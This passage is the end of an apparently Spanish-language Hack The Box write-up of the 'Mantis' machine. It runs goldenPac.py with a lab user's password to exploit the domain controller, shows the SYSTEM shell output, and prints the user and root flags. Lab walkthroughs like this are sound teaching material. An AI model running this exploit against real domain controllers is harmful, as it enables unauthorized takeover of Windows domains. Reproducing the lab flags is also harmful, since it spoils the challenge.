+  <li>Si buscamos información sobre la maquina en <code class="language-plaintext highlighter-rouge">Hackthebox</code> esta es la vulnerabilidad a explotar pero como tal podemos usar <code class="language-plaintext highlighter-rouge">goldenPac</code> <a href="https://adsecurity.org/?p=541">https://adsecurity.org/?p=541</a> nos conectamos con las credenciales de <code class="language-plaintext highlighter-rouge">James</code> y obtenemos <code class="language-plaintext highlighter-rouge">shell</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code> <a href="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Active%20Directory%20Attack/#other-interesting-commands">https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Active%20Directory%20Attack/#other-interesting-commands</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ goldenPac.py htb.local/James:<span class="s1">'J@m3s_P@ssW0rd!'</span>@mantis.htb.local
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attacking domain controller mantis.htb.local
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> mantis.htb.local found vulnerable!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on mantis.htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file eHwshorC.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on mantis.htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service GNlg on mantis.htb.local.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service GNlg.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\J</span>ames<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+62d7a1dbb3d5d824a814e4308408140a
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;         
+</code></pre></div></div>
+
+<h2 id="roottxt">Root.txt</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+521f6d02f0ce80cd0ee5db0dc3a41378
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/hard/2024/04/04/mantis.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolucion de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
